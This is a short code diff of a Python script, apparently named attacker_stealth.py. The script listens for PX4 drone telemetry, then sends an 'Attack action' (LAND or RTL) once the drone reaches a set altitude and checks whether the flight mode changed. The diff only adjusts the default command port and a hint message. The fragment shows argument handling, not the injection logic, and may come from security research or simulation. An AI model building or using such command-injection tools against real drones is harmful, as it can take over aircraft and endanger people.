@@ -53,7 +53,7 @@ def wait_for_mode(tel, want_substr: str, timeout_s: float, filter_autopilot=True
 def main():
     ap = argparse.ArgumentParser()
     ap.add_argument("--tel-port", type=int, default=14540, help="Telemetry listen port (PX4 remote onboard port)")
-    ap.add_argument("--cmd-port", type=int, default=14550, help="Command send port (try 14550, else 14580)")
+    ap.add_argument("--cmd-port", type=int, default=14580, help="Command send port (PX4: 14580; ArduPilot GCS: 14550)")
     ap.add_argument("--trigger-alt", type=float, default=3.0, help="Trigger altitude in meters")
     ap.add_argument("--action", choices=["LAND", "RTL"], default="LAND", help="Attack action")
     ap.add_argument("--verify-timeout", type=float, default=5.0, help="Seconds to wait for mode change proof")
@@ -94,7 +94,7 @@ def main():
     else:
         print(f"⚠️ NOT VERIFIED: did not observe mode containing '{want}' within {args.verify_timeout}s.")
         print("   Try switching cmd port:")
-        print("     python3 attacker_stealth_verified.py --cmd-port 14580 --action LAND --trigger-alt 3")
+        print("     python3 attacker_stealth.py --cmd-port 14580 --action LAND --trigger-alt 3")
 
 
 if __name__ == "__main__":
